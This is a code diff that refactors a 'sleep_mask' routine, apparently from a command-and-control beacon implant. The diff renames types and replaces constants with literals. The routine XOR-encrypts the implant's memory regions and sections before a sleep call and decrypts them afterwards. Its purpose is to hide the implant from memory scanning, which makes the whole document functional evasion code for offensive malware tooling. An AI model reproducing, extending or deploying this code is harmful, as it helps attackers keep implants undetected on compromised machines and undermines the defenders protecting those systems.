@@ -30,7 +30,7 @@ static ULONG_PTR dispatch_call( PFUNCTION_CALL fc ) {
     return ret;
 }
 
-VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
+VOID sleep_mask( PBEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
 
     if ( ! functionCall )
         return;
@@ -42,13 +42,13 @@ VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
     }
 
     /* XOR encrypt beacon memory before sleep */
-    for ( int r = 0; r < SM_MAX_REGIONS; r++ ) {
-        SM_ALLOC_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
+    for ( int r = 0; r < 6; r++ ) {
+        PALLOCATED_MEMORY_REGION reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
         if ( ! reg->AllocationBase || reg->RegionSize == 0 )
             continue;
 
-        for ( int s = 0; s < SM_MAX_SECTIONS; s++ ) {
-            SM_ALLOC_SECTION *sec = &reg->Sections[s];
+        for ( int s = 0; s < 8; s++ ) {
+            PALLOCATED_MEMORY_SECTION sec = &reg->Sections[s];
             if ( ! sec->BaseAddress || sec->VirtualSize == 0 )
                 continue;
             if ( ! sec->MaskSection )
@@ -58,7 +58,7 @@ VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
                 (unsigned char *)sec->BaseAddress,
                 (unsigned int)sec->VirtualSize,
                 (unsigned char *)beaconInfo->mask,
-                SM_MASK_SIZE
+                MASK_SIZE
             );
         }
     }
@@ -67,13 +67,13 @@ VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
     functionCall->retValue = dispatch_call( functionCall );
 
     /* XOR decrypt beacon memory after sleep */
-    for ( int r = 0; r < SM_MAX_REGIONS; r++ ) {
-        SM_ALLOC_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
+    for ( int r = 0; r < 6; r++ ) {
+        PALLOCATED_MEMORY_REGION reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
         if ( ! reg->AllocationBase || reg->RegionSize == 0 )
             continue;
 
-        for ( int s = 0; s < SM_MAX_SECTIONS; s++ ) {
-            SM_ALLOC_SECTION *sec = &reg->Sections[s];
+        for ( int s = 0; s < 8; s++ ) {
+            PALLOCATED_MEMORY_SECTION sec = &reg->Sections[s];
             if ( ! sec->BaseAddress || sec->VirtualSize == 0 )
                 continue;
             if ( ! sec->MaskSection )
@@ -83,7 +83,7 @@ VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
                 (unsigned char *)sec->BaseAddress,
                 (unsigned int)sec->VirtualSize,
                 (unsigned char *)beaconInfo->mask,
-                SM_MASK_SIZE
+                MASK_SIZE
             );
         }
     }
